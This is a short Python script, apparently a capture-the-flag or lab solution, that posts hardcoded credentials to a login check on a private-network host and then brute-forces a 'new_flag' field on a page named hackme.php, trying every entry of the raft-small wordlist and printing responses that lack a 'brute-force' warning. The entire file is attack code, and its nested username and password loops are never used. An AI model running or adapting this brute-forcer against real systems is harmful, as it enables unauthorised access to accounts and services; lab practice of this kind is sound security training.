import requests
lines = []

with open("raft-small.txt", "r") as raft:
    lines = raft.readlines()


s = requests.Session()

for username in lines:
    username = username.strip()
    for password in lines:
        password = password.strip()

        credentials = {
            "login_field": "cgi-bin",
            "cred_field": "ebay"
        }

        #response = s.post("http://172.25.0.32/index.php", data=credentials)
        #pagetext = response.text

        response2 = s.post("http://172.25.0.32/check.php", data=credentials)
        pagetext2 = response2.text

        #if "Bad Credentials!" not in pagetext2:
            #print(response2.text)
            #print(credentials)
        for i in lines:
            mydata = {"new_flag":i.replace("\n","")}

            response2 = s.post("http://172.25.0.32/hackme.php", data=mydata)

            currentPageText = response2.text

            if "brute-force" not in currentPageText:
                print(response2.text)